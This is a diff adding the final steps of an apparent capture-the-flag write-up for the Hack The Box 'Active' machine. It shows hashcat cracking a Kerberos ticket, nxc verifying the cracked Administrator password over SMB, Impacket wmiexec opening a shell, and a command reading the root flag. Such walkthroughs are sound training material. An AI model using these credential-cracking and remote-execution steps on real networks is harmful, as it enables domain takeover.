@@ -100,3 +100,22 @@ Crack the Kerberos ticket with `hashcat`.
 `hashcat -m 13100 tgs_hashes.txt /home/user/tools/rockyou.txt -a 0`
 
 ![](/assets/img/htb/Active/active09.png)
+
+The ticket cracked to domain admin credentials, which I verified over SMB.
+
+`nxc smb 10.129.18.74 -u 'active.htb\Administrator' -p 'Ticketmaster1968' --shares
+
+![](/assets/img/htb/Active/active10.png)
+
+With admin credentials confirmed, I used WMIExec to get an interactive shell.
+
+`python3 /usr/share/doc/python3-impacket/examples/wmiexec.py 'ACTIVE.HTB/Administrator:Ticketmaster1968'@10.129.18.74`
+
+![](/assets/img/htb/Active/active11.png)
+
+From here, you can get the flag.
+
+`type C:\Users\Administrator\Desktop\root.txt`
+
+![](/assets/img/htb/Active/root.png)
+
